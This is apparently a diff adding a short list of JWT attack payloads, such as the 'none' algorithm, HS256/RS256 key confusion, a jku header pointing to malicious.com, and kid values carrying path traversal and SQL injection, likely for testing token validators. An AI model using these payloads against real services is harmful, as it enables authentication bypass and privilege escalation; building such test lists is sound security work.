@@ -1,0 +1,15 @@
+{"alg": "none", "typ": "JWT"}
+{"alg": "NONE", "typ": "JWT"}
+{"alg": "HS256", "typ": "JWT"} (When RS256 is expected, using public key as symmetric secret)
+{"alg": "RS256", "jku": "https://malicious.com/jwks.json"}
+{"alg": "RS256", "kid": "../../../../../../dev/null"}
+{"alg": "RS256", "kid": "admin' OR 1=1--"}
+{"alg": "HS256", "kid": "symmetric_key_id"}
+JWT with "exp" claim set to a past date but valid signature
+JWT with "nbf" claim set to a future date
+JWT with injected payload: {"role": "admin", "permissions": ["*"]}
+JWT with empty signature: header.payload.
+JWT with double encoded payload
+{"alg": "ES256", "typ": "JWT"} (Testing curve substitution attacks)
+{"alg": "mac", "typ": "JWT"}
+JWT payload with null byte: {"user": "admin\u0000user"}
